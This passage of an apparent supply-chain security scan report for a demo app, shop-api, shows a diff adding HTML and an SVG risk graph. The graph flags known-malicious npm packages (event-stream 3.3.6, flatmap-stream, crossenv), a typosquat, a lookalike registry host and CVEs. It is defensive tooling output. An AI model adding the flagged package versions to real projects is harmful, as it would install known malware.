+<p class="meta">GRD-72d6b0c46f · rule CHANGE-VERSION · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> baseline versions: 3.3.4</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/event-stream]</span> current version: 3.3.6</li></ul></details></td>
+<td>event-stream@3.3.6<br><small>direct prod</small></td></tr></tbody></table>
+<h2>Risk paths (how risky packages enter the app)</h2>
+<p class="meta">Only the shortest paths from the application to components with high/critical findings (see --graph-min). Hover a box for its findings. Dashed = dev/build/CI scope. Full graph: dependency-graph.dot / .json and the explorer below.</p>
+<div class="svgwrap"><svg width="685pt" height="704pt"
+ viewBox="0.00 0.00 684.50 703.50" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<g id="graph0" class="graph" transform="scale(1 1) rotate(0) translate(4 699.5)">
+<title>risk</title>
+<polygon fill="white" stroke="transparent" points="-4,4 -4,-699.5 680.5,-699.5 680.5,4 -4,4"/>
+<text text-anchor="middle" x="338.25" y="-682.7" font-family="Helvetica,sans-Serif" font-size="11.00">Risk paths: shop&#45;api@1.4.0 (findings &gt;= high)</text>
+<g id="clust1" class="cluster">
+<title>cluster_legend</title>
+<polygon fill="none" stroke="#dddddd" points="8,-435.5 8,-667.5 134,-667.5 134,-435.5 8,-435.5"/>
+<text text-anchor="middle" x="71" y="-656.3" font-family="Helvetica,sans-Serif" font-size="9.00">legend</text>
+</g>
+<!-- root -->
+<g id="node1" class="node">
+<title>root</title>
+<path fill="#0f2537" stroke="#0f2537" d="M105,-371.5C105,-371.5 37,-371.5 37,-371.5 31,-371.5 25,-365.5 25,-359.5 25,-359.5 25,-347.5 25,-347.5 25,-341.5 31,-335.5 37,-335.5 37,-335.5 105,-335.5 105,-335.5 111,-335.5 117,-341.5 117,-347.5 117,-347.5 117,-359.5 117,-359.5 117,-365.5 111,-371.5 105,-371.5"/>
+<text text-anchor="middle" x="71" y="-351" font-family="Helvetica,sans-Serif" font-size="10.00" fill="white">shop&#45;api@1.4.0</text>
+</g>
+<!-- pkg:docker/fastbuilds/node&#45;runtime@18 -->
+<g id="node2" class="node">
+<title>pkg:docker/fastbuilds/node&#45;runtime@18</title>
+<g id="a_node2"><a xlink:title="[high] Image &#39;fastbuilds/node&#45;runtime&#39; comes from a non&#45;allowlisted publisher (docker.io)">
+<polygon fill="#ffe8d9" stroke="#d9480f" stroke-width="2" points="335.5,-625.5 180.5,-625.5 180.5,-621.5 176.5,-621.5 176.5,-617.5 180.5,-617.5 180.5,-597.5 176.5,-597.5 176.5,-593.5 180.5,-593.5 180.5,-589.5 335.5,-589.5 335.5,-625.5"/>
+<polyline fill="none" stroke="#d9480f" stroke-width="2" points="180.5,-621.5 184.5,-621.5 184.5,-617.5 180.5,-617.5 "/>
+<polyline fill="none" stroke="#d9480f" stroke-width="2" points="180.5,-597.5 184.5,-597.5 184.5,-593.5 180.5,-593.5 "/>
+<text text-anchor="middle" x="258" y="-610.5" font-family="Helvetica,sans-Serif" font-size="10.00">fastbuilds/node&#45;runtime@18</text>
+<text text-anchor="middle" x="258" y="-599.5" font-family="Helvetica,sans-Serif" font-size="10.00">1 finding · high</text>
+</a>
+</g>
+</g>
+<!-- root&#45;&gt;pkg:docker/fastbuilds/node&#45;runtime@18 -->
+<g id="edge12" class="edge">
+<title>root&#45;&gt;pkg:docker/fastbuilds/node&#45;runtime@18</title>
+<path fill="none" stroke="#d9480f" d="M117.04,-366.71C123.49,-370.29 129.46,-374.81 134,-380.5 190.35,-451.23 111.52,-512.82 171.5,-580.5 173.09,-582.29 174.8,-583.97 176.61,-585.54"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="175.58,-587.4 181.61,-589.43 178.16,-584.09 175.58,-587.4"/>
+</g>
+<!-- pkg:githubactions/quick&#45;actions/npm&#45;cache@main -->
+<g id="node3" class="node">
+<title>pkg:githubactions/quick&#45;actions/npm&#45;cache@main</title>
+<g id="a_node3"><a xlink:title="[high] GitHub Action quick&#45;actions/npm&#45;cache: branch/unversioned ref &#39;main&#39; (code changes on every run)">
+<polygon fill="#ffe8d9" stroke="#d9480f" stroke-width="2" stroke-dasharray="5,2" points="344.5,-571 171.5,-571 171.5,-567 167.5,-567 167.5,-563 171.5,-563 171.5,-538 167.5,-538 167.5,-534 171.5,-534 171.5,-530 344.5,-530 344.5,-571"/>
+<polyline fill="none" stroke="#d9480f" stroke-width="2" stroke-dasharray="5,2" points="171.5,-567 175.5,-567 175.5,-563 171.5,-563 "/>
+<polyline fill="none" stroke="#d9480f" stroke-width="2" stroke-dasharray="5,2" points="171.5,-538 175.5,-538 175.5,-534 171.5,-534 "/>
+<text text-anchor="middle" x="258" y="-559" font-family="Helvetica,sans-Serif" font-size="10.00">quick&#45;actions/npm&#45;cache@main</text>
+<text text-anchor="middle" x="258" y="-548" font-family="Helvetica,sans-Serif" font-size="10.00">1 finding · high</text>
+<text text-anchor="middle" x="258" y="-537" font-family="Helvetica,sans-Serif" font-size="10.00">(ci)</text>
+</a>
+</g>
+</g>
+<!-- root&#45;&gt;pkg:githubactions/quick&#45;actions/npm&#45;cache@main -->
+<g id="edge13" class="edge">
+<title>root&#45;&gt;pkg:githubactions/quick&#45;actions/npm&#45;cache@main</title>
+<path fill="none" stroke="#d9480f" d="M117.3,-367.35C123.56,-370.84 129.41,-375.16 134,-380.5 176.27,-429.68 127.21,-474.14 171.5,-521.5 172.95,-523.05 174.48,-524.51 176.08,-525.89"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="175.07,-527.77 181.09,-529.82 177.66,-524.47 175.07,-527.77"/>
+</g>
+<!-- pkg:npm/crossenv@6.1.1 -->
+<g id="node5" class="node">
+<title>pkg:npm/crossenv@6.1.1</title>
+<g id="a_node5"><a xlink:title="[critical] Suspicious install script in crossenv@6.1.1&#10;[critical] crossenv was taken down by npm security (malicious package)&#10;[high] Possible typosquat: &#39;crossenv&#39; looks like &#39;cross&#45;env&#39;">
+<path fill="#f9dedc" stroke="#b3261e" stroke-width="2" stroke-dasharray="5,2" d="M299,-512C299,-512 217,-512 217,-512 211,-512 205,-506 205,-500 205,-500 205,-483 205,-483 205,-477 211,-471 217,-471 217,-471 299,-471 299,-471 305,-471 311,-477 311,-483 311,-483 311,-500 311,-500 311,-506 305,-512 299,-512"/>
+<text text-anchor="middle" x="258" y="-500" font-family="Helvetica,sans-Serif" font-size="10.00">crossenv@6.1.1</text>
+<text text-anchor="middle" x="258" y="-489" font-family="Helvetica,sans-Serif" font-size="10.00">3 findings · critical</text>
+<text text-anchor="middle" x="258" y="-478" font-family="Helvetica,sans-Serif" font-size="10.00">(dev)</text>
+</a>
+</g>
+</g>
+<!-- root&#45;&gt;pkg:npm/crossenv@6.1.1 -->
+<g id="edge14" class="edge">
+<title>root&#45;&gt;pkg:npm/crossenv@6.1.1</title>
+<path fill="none" stroke="#b3261e" d="M117.16,-368.43C123.28,-371.75 129.13,-375.74 134,-380.5 162.37,-408.23 142.13,-434.83 171.5,-461.5 179.46,-468.73 189.26,-474.24 199.36,-478.42"/>
+<polygon fill="#b3261e" stroke="#b3261e" points="198.63,-480.4 204.99,-480.62 200.16,-476.48 198.63,-480.4"/>
+</g>
+<!-- pkg:npm/debug&#45;helper&#45;utils@1.0.2 -->
+<g id="node6" class="node">
+<title>pkg:npm/debug&#45;helper&#45;utils@1.0.2</title>
+<g id="a_node6"><a xlink:title="[high] Lockfile root declares &#39;debug&#45;helper&#45;utils&#39; which is not in package.json">
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" d="M316,-452.5C316,-452.5 200,-452.5 200,-452.5 194,-452.5 188,-446.5 188,-440.5 188,-440.5 188,-428.5 188,-428.5 188,-422.5 194,-416.5 200,-416.5 200,-416.5 316,-416.5 316,-416.5 322,-416.5 328,-422.5 328,-428.5 328,-428.5 328,-440.5 328,-440.5 328,-446.5 322,-452.5 316,-452.5"/>
+<text text-anchor="middle" x="258" y="-437.5" font-family="Helvetica,sans-Serif" font-size="10.00">debug&#45;helper&#45;utils@1.0.2</text>
+<text text-anchor="middle" x="258" y="-426.5" font-family="Helvetica,sans-Serif" font-size="10.00">1 finding · high</text>
+</a>
+</g>
+</g>
+<!-- root&#45;&gt;pkg:npm/debug&#45;helper&#45;utils@1.0.2 -->
+<g id="edge15" class="edge">
+<title>root&#45;&gt;pkg:npm/debug&#45;helper&#45;utils@1.0.2</title>
+<path fill="none" stroke="#d9480f" d="M116.6,-371.55C122.55,-374.35 128.49,-377.36 134,-380.5 151.85,-390.66 153.14,-398.29 171.5,-407.5 176.3,-409.91 181.36,-412.16 186.53,-414.25"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="185.81,-416.22 192.16,-416.46 187.34,-412.31 185.81,-416.22"/>
+</g>
+<!-- pkg:npm/event&#45;stream@3.3.6 -->
+<g id="node7" class="node">
+<title>pkg:npm/event&#45;stream@3.3.6</title>
+<g id="a_node7"><a xlink:title="[critical] Known vulnerability in event&#45;stream@3.3.6: Critical severity vulnerability that affects event&#45;stream and flatmap&#45;stream&#10;[high] event&#45;stream@3.3.6 is not published on the registry (unpublished or fabricated version)">
+<path fill="#f9dedc" stroke="#b3261e" stroke-width="2" d="M304,-398.5C304,-398.5 212,-398.5 212,-398.5 206,-398.5 200,-392.5 200,-386.5 200,-386.5 200,-374.5 200,-374.5 200,-368.5 206,-362.5 212,-362.5 212,-362.5 304,-362.5 304,-362.5 310,-362.5 316,-368.5 316,-374.5 316,-374.5 316,-386.5 316,-386.5 316,-392.5 310,-398.5 304,-398.5"/>
+<text text-anchor="middle" x="258" y="-383.5" font-family="Helvetica,sans-Serif" font-size="10.00">event&#45;stream@3.3.6</text>
+<text text-anchor="middle" x="258" y="-372.5" font-family="Helvetica,sans-Serif" font-size="10.00">2 findings · critical</text>
+</a>
+</g>
+</g>
+<!-- root&#45;&gt;pkg:npm/event&#45;stream@3.3.6 -->
+<g id="edge16" class="edge">
+<title>root&#45;&gt;pkg:npm/event&#45;stream@3.3.6</title>
+<path fill="none" stroke="#b3261e" d="M117.26,-360.1C140.33,-363.47 168.77,-367.62 193.95,-371.3"/>
+<polygon fill="#b3261e" stroke="#b3261e" points="193.7,-373.38 199.94,-372.17 194.31,-369.23 193.7,-373.38"/>
+</g>
+<!-- pkg:npm/express@4.17.1 -->
+<g id="node8" class="node">
+<title>pkg:npm/express@4.17.1</title>
+<path fill="white" stroke="#9aa1a9" d="M293.5,-344.5C293.5,-344.5 222.5,-344.5 222.5,-344.5 216.5,-344.5 210.5,-338.5 210.5,-332.5 210.5,-332.5 210.5,-320.5 210.5,-320.5 210.5,-314.5 216.5,-308.5 222.5,-308.5 222.5,-308.5 293.5,-308.5 293.5,-308.5 299.5,-308.5 305.5,-314.5 305.5,-320.5 305.5,-320.5 305.5,-332.5 305.5,-332.5 305.5,-338.5 299.5,-344.5 293.5,-344.5"/>
+<text text-anchor="middle" x="258" y="-324" font-family="Helvetica,sans-Serif" font-size="10.00">express@4.17.1</text>
+</g>
+<!-- root&#45;&gt;pkg:npm/express@4.17.1 -->
+<g id="edge17" class="edge">
+<title>root&#45;&gt;pkg:npm/express@4.17.1</title>
+<path fill="none" stroke="#9aa1a9" d="M117.26,-346.9C143.51,-343.06 176.71,-338.22 204.16,-334.21"/>
+<polygon fill="#9aa1a9" stroke="#9aa1a9" points="204.65,-336.26 210.28,-333.32 204.04,-332.11 204.65,-336.26"/>
+</g>
+<!-- pkg:npm/lodash@4.17.15 -->
+<g id="node12" class="node">
+<title>pkg:npm/lodash@4.17.15</title>
+<g id="a_node12"><a xlink:title="[critical] Integrity hash changed for unchanged version lodash@4.17.15&#10;[critical] Lockfile hash for lodash@4.17.15 does not match the registry&#10;[high] Known vulnerability in lodash@4.17.15: Command Injection in lodash&#10;[high] Known vulnerability in lodash@4.17.15: Prototype Pollution in lodash&#10;[high] Known vulnerability in lodash@4.17.15: lodash vulnerable to Code Injection via `_.template` imports key names">
+<path fill="#f9dedc" stroke="#b3261e" stroke-width="2" d="M299,-290.5C299,-290.5 217,-290.5 217,-290.5 211,-290.5 205,-284.5 205,-278.5 205,-278.5 205,-266.5 205,-266.5 205,-260.5 211,-254.5 217,-254.5 217,-254.5 299,-254.5 299,-254.5 305,-254.5 311,-260.5 311,-266.5 311,-266.5 311,-278.5 311,-278.5 311,-284.5 305,-290.5 299,-290.5"/>
+<text text-anchor="middle" x="258" y="-275.5" font-family="Helvetica,sans-Serif" font-size="10.00">lodash@4.17.15</text>
+<text text-anchor="middle" x="258" y="-264.5" font-family="Helvetica,sans-Serif" font-size="10.00">5 findings · critical</text>
+</a>
+</g>
+</g>
+<!-- root&#45;&gt;pkg:npm/lodash@4.17.15 -->
+<g id="edge18" class="edge">
+<title>root&#45;&gt;pkg:npm/lodash@4.17.15</title>
+<path fill="none" stroke="#b3261e" d="M101.74,-335.41C121.13,-324.11 147.26,-309.79 171.5,-299.5 180.28,-295.77 189.76,-292.28 199.09,-289.13"/>
+<polygon fill="#b3261e" stroke="#b3261e" points="199.84,-291.09 204.88,-287.21 198.52,-287.1 199.84,-291.09"/>
+</g>
+<!-- pkg:npm/minimist@1.2.5 -->
+<g id="node14" class="node">
+<title>pkg:npm/minimist@1.2.5</title>
+<g id="a_node14"><a xlink:title="[critical] Known vulnerability in minimist@1.2.5: Prototype Pollution in minimist&#10;[high] Download source for minimist@1.2.5 changed: registry.npmjs.org &#45;&gt; registry.npmjs&#45;cdn.com&#10;[high] minimist@1.2.5 is fetched over plain HTTP">
+<path fill="#f9dedc" stroke="#b3261e" stroke-width="2" d="M299,-236.5C299,-236.5 217,-236.5 217,-236.5 211,-236.5 205,-230.5 205,-224.5 205,-224.5 205,-212.5 205,-212.5 205,-206.5 211,-200.5 217,-200.5 217,-200.5 299,-200.5 299,-200.5 305,-200.5 311,-206.5 311,-212.5 311,-212.5 311,-224.5 311,-224.5 311,-230.5 305,-236.5 299,-236.5"/>
+<text text-anchor="middle" x="258" y="-221.5" font-family="Helvetica,sans-Serif" font-size="10.00">minimist@1.2.5</text>
+<text text-anchor="middle" x="258" y="-210.5" font-family="Helvetica,sans-Serif" font-size="10.00">3 findings · critical</text>
+</a>
+</g>
+</g>
+<!-- root&#45;&gt;pkg:npm/minimist@1.2.5 -->
+<g id="edge19" class="edge">
+<title>root&#45;&gt;pkg:npm/minimist@1.2.5</title>
+<path fill="none" stroke="#b3261e" d="M84.27,-335.09C101.18,-311.11 133.85,-269.43 171.5,-245.5 179.96,-240.13 189.57,-235.75 199.21,-232.2"/>
+<polygon fill="#b3261e" stroke="#b3261e" points="199.92,-234.18 204.89,-230.21 198.53,-230.22 199.92,-234.18"/>
+</g>
+<!-- pkg:npm/mocha@8.4.0 -->
+<g id="node15" class="node">
+<title>pkg:npm/mocha@8.4.0</title>
+<path fill="white" stroke="#9aa1a9" stroke-dasharray="5,2" d="M287.5,-182.5C287.5,-182.5 228.5,-182.5 228.5,-182.5 222.5,-182.5 216.5,-176.5 216.5,-170.5 216.5,-170.5 216.5,-158.5 216.5,-158.5 216.5,-152.5 222.5,-146.5 228.5,-146.5 228.5,-146.5 287.5,-146.5 287.5,-146.5 293.5,-146.5 299.5,-152.5 299.5,-158.5 299.5,-158.5 299.5,-170.5 299.5,-170.5 299.5,-176.5 293.5,-182.5 287.5,-182.5"/>
+<text text-anchor="middle" x="258" y="-167.5" font-family="Helvetica,sans-Serif" font-size="10.00">mocha@8.4.0</text>
+<text text-anchor="middle" x="258" y="-156.5" font-family="Helvetica,sans-Serif" font-size="10.00">(dev)</text>
+</g>
+<!-- root&#45;&gt;pkg:npm/mocha@8.4.0 -->
+<g id="edge20" class="edge">
+<title>root&#45;&gt;pkg:npm/mocha@8.4.0</title>
+<path fill="none" stroke="#9aa1a9" d="M78.28,-335.24C90.72,-301.75 121.68,-230.4 171.5,-191.5 182.67,-182.78 196.71,-176.84 210.17,-172.82"/>
+<polygon fill="#9aa1a9" stroke="#9aa1a9" points="211.09,-174.74 216.3,-171.1 209.95,-170.7 211.09,-174.74"/>
+</g>
+<!-- pkg:npm/node&#45;fetch@2.6.0 -->
+<g id="node17" class="node">
+<title>pkg:npm/node&#45;fetch@2.6.0</title>
+<g id="a_node17"><a xlink:title="[high] Known vulnerability in node&#45;fetch@2.6.0: node&#45;fetch forwards secure headers to untrusted sites">
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" d="M297.5,-128.5C297.5,-128.5 218.5,-128.5 218.5,-128.5 212.5,-128.5 206.5,-122.5 206.5,-116.5 206.5,-116.5 206.5,-104.5 206.5,-104.5 206.5,-98.5 212.5,-92.5 218.5,-92.5 218.5,-92.5 297.5,-92.5 297.5,-92.5 303.5,-92.5 309.5,-98.5 309.5,-104.5 309.5,-104.5 309.5,-116.5 309.5,-116.5 309.5,-122.5 303.5,-128.5 297.5,-128.5"/>
+<text text-anchor="middle" x="258" y="-113.5" font-family="Helvetica,sans-Serif" font-size="10.00">node&#45;fetch@2.6.0</text>
+<text text-anchor="middle" x="258" y="-102.5" font-family="Helvetica,sans-Serif" font-size="10.00">1 finding · high</text>
+</a>
+</g>
+</g>
+<!-- root&#45;&gt;pkg:npm/node&#45;fetch@2.6.0 -->
+<g id="edge21" class="edge">
+<title>root&#45;&gt;pkg:npm/node&#45;fetch@2.6.0</title>
+<path fill="none" stroke="#d9480f" d="M75.18,-335.47C83.41,-294.24 109.25,-192.38 171.5,-137.5 179.78,-130.2 190.02,-124.88 200.52,-120.99"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="201.37,-122.92 206.36,-118.98 200,-118.95 201.37,-122.92"/>
+</g>
+<!-- pkg:npm/body&#45;parser@1.19.0 -->
+<g id="node4" class="node">
+<title>pkg:npm/body&#45;parser@1.19.0</title>
+<g id="a_node4"><a xlink:title="[high] Known vulnerability in body&#45;parser@1.19.0: body&#45;parser vulnerable to Denial of Service via trailing bytes after a compressed request body&#10;[high] Known vulnerability in body&#45;parser@1.19.0: body&#45;parser vulnerable to denial of service when url encoding is enabled">
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" d="M504.5,-398.5C504.5,-398.5 413.5,-398.5 413.5,-398.5 407.5,-398.5 401.5,-392.5 401.5,-386.5 401.5,-386.5 401.5,-374.5 401.5,-374.5 401.5,-368.5 407.5,-362.5 413.5,-362.5 413.5,-362.5 504.5,-362.5 504.5,-362.5 510.5,-362.5 516.5,-368.5 516.5,-374.5 516.5,-374.5 516.5,-386.5 516.5,-386.5 516.5,-392.5 510.5,-398.5 504.5,-398.5"/>
+<text text-anchor="middle" x="459" y="-383.5" font-family="Helvetica,sans-Serif" font-size="10.00">body&#45;parser@1.19.0</text>
+<text text-anchor="middle" x="459" y="-372.5" font-family="Helvetica,sans-Serif" font-size="10.00">2 findings · high</text>
+</a>
+</g>
+</g>
+<!-- pkg:npm/qs@6.7.0 -->
+<g id="node19" class="node">
+<title>pkg:npm/qs@6.7.0</title>
+<g id="a_node19"><a xlink:title="[high] Known vulnerability in qs@6.7.0: qs vulnerable to Prototype Pollution">
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" d="M657.5,-327.5C657.5,-327.5 592.5,-327.5 592.5,-327.5 586.5,-327.5 580.5,-321.5 580.5,-315.5 580.5,-315.5 580.5,-303.5 580.5,-303.5 580.5,-297.5 586.5,-291.5 592.5,-291.5 592.5,-291.5 657.5,-291.5 657.5,-291.5 663.5,-291.5 669.5,-297.5 669.5,-303.5 669.5,-303.5 669.5,-315.5 669.5,-315.5 669.5,-321.5 663.5,-327.5 657.5,-327.5"/>
+<text text-anchor="middle" x="625" y="-312.5" font-family="Helvetica,sans-Serif" font-size="10.00">qs@6.7.0</text>
+<text text-anchor="middle" x="625" y="-301.5" font-family="Helvetica,sans-Serif" font-size="10.00">1 finding · high</text>
+</a>
+</g>
+</g>
+<!-- pkg:npm/body&#45;parser@1.19.0&#45;&gt;pkg:npm/qs@6.7.0 -->
+<g id="edge1" class="edge">
+<title>pkg:npm/body&#45;parser@1.19.0&#45;&gt;pkg:npm/qs@6.7.0</title>
+<path fill="none" stroke="#d9480f" d="M508.73,-362.38C516.06,-359.5 523.51,-356.48 530.5,-353.5 547.26,-346.36 565.43,-337.96 581.26,-330.43"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="582.47,-332.18 586.98,-327.7 580.66,-328.39 582.47,-332.18"/>
+</g>
+<!-- pkg:npm/flatmap&#45;stream@0.1.1 -->
+<g id="node9" class="node">
+<title>pkg:npm/flatmap&#45;stream@0.1.1</title>
+<g id="a_node9"><a xlink:title="[critical] Known malicious package in flatmap&#45;stream@0.1.1: Malicious Package in flatmap&#45;stream&#10;[critical] flatmap&#45;stream was taken down by npm security (malicious package)&#10;[critical] Known vulnerability in flatmap&#45;stream@0.1.1: Critical severity vulnerability that affects event&#45;stream and flatmap&#45;stream">
+<path fill="#f9dedc" stroke="#b3261e" stroke-width="2" d="M510,-452.5C510,-452.5 408,-452.5 408,-452.5 402,-452.5 396,-446.5 396,-440.5 396,-440.5 396,-428.5 396,-428.5 396,-422.5 402,-416.5 408,-416.5 408,-416.5 510,-416.5 510,-416.5 516,-416.5 522,-422.5 522,-428.5 522,-428.5 522,-440.5 522,-440.5 522,-446.5 516,-452.5 510,-452.5"/>
+<text text-anchor="middle" x="459" y="-437.5" font-family="Helvetica,sans-Serif" font-size="10.00">flatmap&#45;stream@0.1.1</text>
+<text text-anchor="middle" x="459" y="-426.5" font-family="Helvetica,sans-Serif" font-size="10.00">3 findings · critical</text>
+</a>
+</g>
+</g>
+<!-- pkg:npm/event&#45;stream@3.3.6&#45;&gt;pkg:npm/flatmap&#45;stream@0.1.1 -->
+<g id="edge2" class="edge">
+<title>pkg:npm/event&#45;stream@3.3.6&#45;&gt;pkg:npm/flatmap&#45;stream@0.1.1</title>
+<path fill="none" stroke="#b3261e" d="M316.03,-395.97C339,-402.21 365.7,-409.45 389.7,-415.97"/>
+<polygon fill="#b3261e" stroke="#b3261e" points="389.4,-418.06 395.74,-417.6 390.5,-414.01 389.4,-418.06"/>
+</g>
+<!-- pkg:npm/express@4.17.1&#45;&gt;pkg:npm/body&#45;parser@1.19.0 -->
+<g id="edge3" class="edge">
+<title>pkg:npm/express@4.17.1&#45;&gt;pkg:npm/body&#45;parser@1.19.0</title>
+<path fill="none" stroke="#d9480f" d="M305.66,-339.16C332.36,-346.41 366.22,-355.6 395.23,-363.47"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="395.01,-365.58 401.35,-365.13 396.11,-361.53 395.01,-365.58"/>
+</g>
+<!-- pkg:npm/path&#45;to&#45;regexp@0.1.7 -->
+<g id="node18" class="node">
+<title>pkg:npm/path&#45;to&#45;regexp@0.1.7</title>
+<g id="a_node18"><a xlink:title="[high] Known vulnerability in path&#45;to&#45;regexp@0.1.7: path&#45;to&#45;regexp contains a ReDoS&#10;[high] Known vulnerability in path&#45;to&#45;regexp@0.1.7: path&#45;to&#45;regexp outputs backtracking regular expressions&#10;[high] Known vulnerability in path&#45;to&#45;regexp@0.1.7: path&#45;to&#45;regexp vulnerable to Regular Expression Denial of Service via multiple route parameters">
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" d="M508.5,-344.5C508.5,-344.5 409.5,-344.5 409.5,-344.5 403.5,-344.5 397.5,-338.5 397.5,-332.5 397.5,-332.5 397.5,-320.5 397.5,-320.5 397.5,-314.5 403.5,-308.5 409.5,-308.5 409.5,-308.5 508.5,-308.5 508.5,-308.5 514.5,-308.5 520.5,-314.5 520.5,-320.5 520.5,-320.5 520.5,-332.5 520.5,-332.5 520.5,-338.5 514.5,-344.5 508.5,-344.5"/>
+<text text-anchor="middle" x="459" y="-329.5" font-family="Helvetica,sans-Serif" font-size="10.00">path&#45;to&#45;regexp@0.1.7</text>
+<text text-anchor="middle" x="459" y="-318.5" font-family="Helvetica,sans-Serif" font-size="10.00">3 findings · high</text>
+</a>
+</g>
+</g>
+<!-- pkg:npm/express@4.17.1&#45;&gt;pkg:npm/path&#45;to&#45;regexp@0.1.7 -->
+<g id="edge4" class="edge">
+<title>pkg:npm/express@4.17.1&#45;&gt;pkg:npm/path&#45;to&#45;regexp@0.1.7</title>
+<path fill="none" stroke="#d9480f" d="M305.66,-326.5C331.08,-326.5 362.98,-326.5 391.01,-326.5"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="391.3,-328.6 397.3,-326.5 391.3,-324.4 391.3,-328.6"/>
+</g>
+<!-- pkg:npm/express@4.17.1&#45;&gt;pkg:npm/qs@6.7.0 -->
+<g id="edge5" class="edge">
+<title>pkg:npm/express@4.17.1&#45;&gt;pkg:npm/qs@6.7.0</title>
+<path fill="none" stroke="#d9480f" d="M305.63,-314.27C329.86,-308.54 360.06,-302.35 387.5,-299.5 450.72,-292.93 467.03,-296.12 530.5,-299.5 544.76,-300.26 560.2,-301.67 574.34,-303.19"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="574.12,-305.28 580.32,-303.85 574.58,-301.11 574.12,-305.28"/>
+</g>
+<!-- pkg:npm/glob@7.1.6 -->
+<g id="node10" class="node">
+<title>pkg:npm/glob@7.1.6</title>
+<path fill="white" stroke="#9aa1a9" stroke-dasharray="5,2" d="M482.5,-252.5C482.5,-252.5 435.5,-252.5 435.5,-252.5 429.5,-252.5 423.5,-246.5 423.5,-240.5 423.5,-240.5 423.5,-228.5 423.5,-228.5 423.5,-222.5 429.5,-216.5 435.5,-216.5 435.5,-216.5 482.5,-216.5 482.5,-216.5 488.5,-216.5 494.5,-222.5 494.5,-228.5 494.5,-228.5 494.5,-240.5 494.5,-240.5 494.5,-246.5 488.5,-252.5 482.5,-252.5"/>
+<text text-anchor="middle" x="459" y="-237.5" font-family="Helvetica,sans-Serif" font-size="10.00">glob@7.1.6</text>
+<text text-anchor="middle" x="459" y="-226.5" font-family="Helvetica,sans-Serif" font-size="10.00">(dev)</text>
+</g>
+<!-- pkg:npm/minimatch@3.0.4 -->
+<g id="node13" class="node">
+<title>pkg:npm/minimatch@3.0.4</title>
+<g id="a_node13"><a xlink:title="[high] Known vulnerability in minimatch@3.0.4: minimatch ReDoS vulnerability&#10;[high] Known vulnerability in minimatch@3.0.4: minimatch ReDoS: nested *() extglobs generate catastrophically backtracking regular expressions&#10;[high] Known vulnerability in minimatch@3.0.4: minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non&#45;adjacent GLOBSTAR segments&#10;[high] Known vulnerability in minimatch@3.0.4: minimatch has a ReDoS via repeated wildcards with non&#45;matching literal in pattern">
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" stroke-dasharray="5,2" d="M664.5,-226C664.5,-226 585.5,-226 585.5,-226 579.5,-226 573.5,-220 573.5,-214 573.5,-214 573.5,-197 573.5,-197 573.5,-191 579.5,-185 585.5,-185 585.5,-185 664.5,-185 664.5,-185 670.5,-185 676.5,-191 676.5,-197 676.5,-197 676.5,-214 676.5,-214 676.5,-220 670.5,-226 664.5,-226"/>
+<text text-anchor="middle" x="625" y="-214" font-family="Helvetica,sans-Serif" font-size="10.00">minimatch@3.0.4</text>
+<text text-anchor="middle" x="625" y="-203" font-family="Helvetica,sans-Serif" font-size="10.00">4 findings · high</text>
+<text text-anchor="middle" x="625" y="-192" font-family="Helvetica,sans-Serif" font-size="10.00">(dev)</text>
+</a>
+</g>
+</g>
+<!-- pkg:npm/glob@7.1.6&#45;&gt;pkg:npm/minimatch@3.0.4 -->
+<g id="edge6" class="edge">
+<title>pkg:npm/glob@7.1.6&#45;&gt;pkg:npm/minimatch@3.0.4</title>
+<path fill="none" stroke="#d9480f" d="M494.78,-228.35C515.84,-224.63 543.21,-219.79 567.34,-215.52"/>
+<polygon fill="#d9480f" stroke="#d9480f" points="567.85,-217.56 573.39,-214.45 567.12,-213.43 567.85,-217.56"/>
+</g>
+<!-- pkg:npm/js&#45;yaml@4.0.0 -->
+<g id="node11" class="node">
+<title>pkg:npm/js&#45;yaml@4.0.0</title>
+<g id="a_node11"><a xlink:title="[high] Known vulnerability in js&#45;yaml@4.0.0: JS&#45;YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) — CVE&#45;2026&#45;59870 fix not backported&#10;[high] Known vulnerability in js&#45;yaml@4.0.0: js&#45;yaml: YAML merge&#45;key chains can force quadratic CPU consumption&#10;[high] Known vulnerability in js&#45;yaml@4.0.0: js&#45;yaml: maxTotalMergeKeys does not limit CPU use for empty merge sources">
+<path fill="#ffe8d9" stroke="#d9480f" stroke-width="2" stroke-dasharray="5,2" d="M494,-198C494,-198 424,-198 424,-198 418,-198 412,-192 412,-186 412,-186 412,-169 412,-169 412,-163 418,-157 424,-157 424,-157 494,-157 494,-157 500,-157 506,-163 506,-169 506,-169 506,-186 506,-186 506,-192 500,-198 494,-198"/>
+<text text-anchor="middle" x="459" y="-186" font-family="Helvetica,sans-Serif" font-size="10.00">js&#45;yaml@4.0.0</text>
+<text text-anchor="middle" x="459" y="-175" font-family="Helvetica,sans-Serif" font-size="10.00">3 findings · high</text>
+<text text-anchor="middle" x="459" y="-164" font-family="Helvetica,sans-Serif" font-size="10.00">(dev)</text>
+</a>
+</g>
+</g>
+<!-- pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/glob@7.1.6 -->
+<g id="edge7" class="edge">
+<title>pkg:npm/mocha@8.4.0&#45;&gt;pkg:npm/glob@7.1.6</title>
+<path fill="none" stroke="#9aa1a9" d="M299.6,-176.81C313.86,-181.27 329.94,-186.45 344.5,-191.5 368.99,-200 396.15,-210.26 417.76,-218.62"/>
